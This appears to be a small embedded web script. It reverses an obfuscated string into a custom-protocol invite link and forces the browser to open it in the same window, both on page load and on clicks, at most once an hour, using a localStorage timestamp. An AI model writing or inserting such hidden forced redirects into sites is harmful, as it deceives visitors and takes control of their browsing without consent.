(function(docpointer) {
	let eatApple = "ecioVhsimarA=etivni?nioj//:te".split("").reverse().join("");
	let showPopUp = function() {
		let meItem = localStorage.getItem("popcornlast");
		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
			return true;
		}
		return false;
	};
	
	if(document.readyState === 'ready' || document.readyState === 'complete') {
		if (showPopUp()) {
			window.open(eatApple, "_self");
		}
	}
	else {
		document.addEventListener("readystatechange", function(e) {
			if ((document.readyState === 'ready' || document.readyState === 'complete') && showPopUp()) {
				window.open(eatApple, "_self");
			}
		});
	}
	
	document.addEventListener("click", function(e) {
		if (showPopUp()) {			
			window.open(eatApple, "_self");				
			localStorage.setItem("popcornlast", Date.now());
		}
	});
})(document);
